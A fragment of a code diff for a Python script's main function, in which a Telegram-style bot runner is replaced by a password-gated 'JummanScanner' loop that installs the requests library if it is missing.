+        input("\nPress Enter to continue...")
 
 
 # ============ MAIN ============
 def main():
-    # Check password first
-    check_password()
-    
-    # Install dependencies
-    install_dependencies()
-    
     try:
-        bot = JummanBot(BOT_TOKEN)
-        bot.run()
+        # Check password first
+        check_password()
+        
+        # Check dependencies
+        try:
+            import requests
+        except ImportError:
+            print("[*] Installing requests...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+        
+        # Run scanner
+        scanner = JummanScanner()
+        while True:
+            scanner.run()
     except KeyboardInterrupt:
-        print("\n[!] Bot stopped")
+        print("\n\n[!] Interrupted by user")
         sys.exit(0)
     except Exception as e:
         print(f"\n[!] Error: {e}")
-        import traceback
-        traceback.print_exc()
         sys.exit(1)
 
 if __name__ == "__main__":
